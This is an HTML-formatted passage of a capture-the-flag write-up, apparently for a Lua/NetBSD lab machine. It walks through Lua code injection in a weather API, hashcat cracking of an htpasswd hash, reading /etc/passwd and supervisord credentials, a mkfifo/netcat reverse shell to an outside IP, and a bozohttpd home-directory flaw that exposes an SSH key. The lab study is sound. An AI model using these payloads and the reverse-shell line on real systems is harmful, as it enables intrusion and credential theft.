&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-19_00-39-53.png&quot; alt=&quot;Screenshot_2021-03-19_00-39-53&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As the message suggest, we try passing the ‘city=list’ argument and get a list of available cities. When passing one of those city we get a neat JSON weather forecast. This does seem like a solid attack vector, so we try to exploit it.&lt;/p&gt;

&lt;h2 id=&quot;exploitation---api&quot;&gt;Exploitation - API&lt;/h2&gt;

&lt;p&gt;After going through the &lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-web/api-pentesting&quot;&gt;API Pentesting&lt;/a&gt; page from HackTricks, and trying some of the methods suggested there, we didn’t really land anything. Instead we try poisoning the input with nasty strings, or rather the &lt;a href=&quot;https://github.com/minimaxir/big-list-of-naughty-strings&quot;&gt;Big List of Naughty String&lt;/a&gt; in conjunction with &lt;strong&gt;wfuzz&lt;/strong&gt;, hiding error codes 500:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-16_00-14-10.png&quot; alt=&quot;Screenshot_2021-03-16_00-14-10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Replicating some of these requests in &lt;strong&gt;burp&lt;/strong&gt;, we find out that the API is returning us some error codes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{&quot;code&quot;: 500,&amp;lt;br&amp;gt;Lua error: [string &quot;                httpd.write('{&quot;code&quot;: 500,')...&quot;]:2: attempt to call a nil value (global 's')

&amp;lt;br&amp;gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From these, we deduct that:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;We are dealing with Lua; not a surprise considering the name of the box.&lt;/li&gt;
  &lt;li&gt;API is in &lt;em&gt;/usr/local/webapi/weather.lua&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;getting-rce&quot;&gt;Getting RCE&lt;/h3&gt;

&lt;p&gt;Now that we know better what we’re dealing with, we try manually injecting some bad character to get Lua to execute one of our commands, but not being proficient in Lua, we search around for Lua vulnerabilities, we find a very thorough article on this topi: https://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities, most specifically in the &lt;em&gt;Lua Code Injection&lt;/em&gt; section:&lt;/p&gt;

&lt;div class=&quot;language-lua highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- ngx_lua&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- /vulnerable.lua?name=John&quot;)%20os.execute(&quot;notepad.exe&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ngx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_uri_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ngx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;text/html&quot;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;string.format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[[
     ngx.say(&quot;Hello, %s&quot;)
     ngx.say(&quot;Today is &quot;..os.date())
    ]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;loadstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Adapting the example above with the file read section of &lt;a href=&quot;https://gtfobins.github.io/gtfobins/lua/#file-read&quot;&gt;Lua from GTFOBins&lt;/a&gt;, we manage to gain RCE:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-16_01-12-38.png&quot; alt=&quot;Screenshot_2021-03-16_01-12-38&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;optional-custom-shell&quot;&gt;(Optional) Custom Shell&lt;/h3&gt;

&lt;p&gt;At this point, we decided to code out own custom RCE exploit in python, mostly because this seemed simple enough to try something new. This is completely overkill, but was a good experience making our own barely-interactive remote “shell”.&lt;/p&gt;

&lt;p&gt;You can review it &lt;u&gt;here&lt;/u&gt;.&lt;/p&gt;

&lt;p&gt;Of course, I learnt about the Python cmd library a few days after which would have made things even more simple.&lt;/p&gt;

&lt;h3 id=&quot;getting-a-shell-back&quot;&gt;Getting a Shell Back&lt;/h3&gt;

&lt;p&gt;User the custom web shell above, we can start doing some basic recon on the box. Our first interest is in the the .&lt;em&gt;htpasswd&lt;/em&gt; present on both web services. On the directory we land on, we find the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-19_01-13-49.png&quot; alt=&quot;Screenshot_2021-03-19_01-13-49&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we have the user &lt;strong&gt;webapi_user&lt;/strong&gt; and grabbing the hash for it, and going to hashcat:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 500 ./hashes.hash ./rockyou.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We easily crack the hash: &lt;strong&gt;iamthebest&lt;/strong&gt;. Next we enumerate the users having shells:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;sh&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
root:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:0:0:Charlie &amp;amp;:/root:/bin/sh
toor:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:0:0:Bourne-again Superuser:/root:/bin/sh
r.michaels:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:1000:100::/home/r.michaels:/bin/ksh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Additionally, by going through some documentation of &lt;strong&gt;Supervisor&lt;/strong&gt;, we find that we can expect the configuration files to be located in &lt;em&gt;/etc/supervisord.conf&lt;/em&gt;, which in its turn should contain the html credentials. Finding and reading the file, we find out the &lt;em&gt;inet_http_server&lt;/em&gt; settings:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[inet_http_server]
port = 0.0.0.0:9001
username = user
password = 123
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With those two sets of credentials, we can now login in the respective web services: port 80 doesn’t reveal anything interesting except the API path we already found. Port 9001 does now give us access to the &lt;strong&gt;Supervisor&lt;/strong&gt; web panel. We see a few scripts which monitor the machine’s process and memory. We also notice the version running to be &lt;em&gt;4.2.0&lt;/em&gt;, which makes it not vulnerable by the exploit we mentioned earlier.&lt;/p&gt;

&lt;p&gt;We also try &lt;strong&gt;ssh&lt;/strong&gt; in, but the service is setup to only accept public keys.&lt;/p&gt;

&lt;p&gt;Using our make-shift shell, we check what kind of services we have available; the standard reverse shell technique do not seem to work here, so we find one payload that seem to work by sending this from our shell (which calls the API):&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.14.187 9002 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We now gain a more proper shell as user &lt;strong&gt;_httpd&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;Our current user, &lt;strong&gt;_httpd&lt;/strong&gt; doesn’t seem to have much permissions; we can check  our landing directory for additional files, but do not find anything new we couldn’t get with our makeshift shell previously. However, from the user list we got earlier, we decide to target the user &lt;strong&gt;r.michaels&lt;/strong&gt; first.&lt;/p&gt;

&lt;h3 id=&quot;_httpd-to-rmichaels&quot;&gt;_httpd to r.michaels&lt;/h3&gt;

&lt;p&gt;We cannot read &lt;strong&gt;r.michaels&lt;/strong&gt; home folder, so instead we search for files belonging to him that would be of interest to us :&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; r.michaels &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null
&lt;span class=&quot;c&quot;&gt;#returns nothing&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We remember seeing something about service running on port 3000 on localhost, so we verify what are the port opens on the machine:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netstat &lt;span class=&quot;nt&quot;&gt;-atn&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;LISTEN
tcp        0      0  127.0.0.1.3000         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
tcp        0      0  127.0.0.1.3001         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
tcp        0      0  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.80                   &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
tcp        0      0  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.22                   &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
tcp        0      0  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.9001                 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
tcp6       0      0  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.22                   &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Indeed, we see two extra services listening locally for the API. Port &lt;em&gt;3000&lt;/em&gt; is no surprise. We can verify this by &lt;strong&gt;curl&lt;/strong&gt; the api with our previous credentials for &lt;strong&gt;webapi_user&lt;/strong&gt; and indeed, it’s the same as on the web page.&lt;/p&gt;

&lt;p&gt;However port &lt;em&gt;3001&lt;/em&gt; is new to us; the same &lt;strong&gt;curl&lt;/strong&gt; to it:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;  webapi_user:iamthebest &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 127.0.0.1:3001
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Shows again the same thing. This would seem to be a mirrored version of the API.  We attempt to dig more onto what’s going on on this port by checking the list of processes:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;3001
r.michaels   185  0.0  0.0  34996  1996 ?     Is    5:45AM 0:00.01 /usr/libexec/httpd &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; 3001 &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; weather /home/r.michaels/devel/webapi/weather.lua &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /var/run/httpd_devel.pid &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; r.michae

&lt;span class=&quot;c&quot;&gt;# The full line was truncated, so we can check it more directly by looking at the cmdline file for the correspindong PID in /proc&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/185/cmdline                         
/usr/libexec/httpd-u-X-s-i127.0.0.1-I3001-Lweather/home/r.michaels/devel/webapi/weather.lua-P/var/run/httpd_devel.pid-Ur.michaels-b/home/r.michaels/devel/www
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So from the cmdline, we see that our target user is actually running this process, which appear to be a development branch of the API. We attempt the same exploit as our initial attack, but this time around the input seem to be better sanitised and we cannot get in the same way.&lt;/p&gt;

&lt;p&gt;At this point we were going around a bit in circle, not sure how to exploit this. At some point, we went back to the API and noticed the server running being &lt;em&gt;Server: bozohttpd/20190228&lt;/em&gt;. Searchsploit doesn’t return any vulnerability, however, looking on the web, there seem to be old CVE available, mostly around versions:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;before 20140708&lt;/em&gt; &amp;gt; bypass the HTTP auth. Irrelevant in our case.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;before 20100621&lt;/em&gt; &amp;gt; access content of home directories with URI starting with /~. This one is interesting.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;20090522 through 20100512&lt;/em&gt;, ours being &lt;em&gt;20190228&lt;/em&gt;, it would seem unlikely any of those work.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At this point however, we had to receive a nudge to get going; mostly telling us to continue at the same service and that somehow, the old exploit might still be relevant… The idea seemed far fetched, but we dig a bit more in the home directory CVE. We find a more in depth description of the issue here: https://bugs.launchpad.net/ubuntu/+source/bozohttpd/+bug/582473.&lt;/p&gt;

&lt;p&gt;Following the description, we attempt the same:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;  webapi_user:iamthebest &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 127.0.0.1:3001/~r.michaels/  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Which returns:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nl&quot;&gt;border-top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;solid&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nl&quot;&gt;border-bottom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;solid&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;aquamarine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:nth-child&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;even&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;lavender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Index of ~r.michaels/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Index of ~r.michaels/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cols=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;thead&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&lt;/span&gt;Name&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&amp;gt;&lt;/span&gt;Last modified&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Size
&lt;span class=&quot;nt&quot;&gt;&amp;lt;tbody&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;../&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Parent Directory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;16-Sep-2020 18:20&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;1kB
&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;id_rsa&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;id_rsa&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;16-Sep-2020 16:52&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;3kB
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;

* Closing connection 0
luanne$ curl -u  webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/    
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nl&quot;&gt;border-top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;solid&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nl&quot;&gt;border-bottom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;solid&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;aquamarine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:nth-child&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;even&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;lavender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Index of ~r.michaels/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Index of ~r.michaels/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cols=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;thead&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&lt;/span&gt;Name&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&amp;gt;&lt;/span&gt;Last modified&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Size
&lt;span class=&quot;nt&quot;&gt;&amp;lt;tbody&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;../&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Parent Directory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;16-Sep-2020 18:20&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;1kB
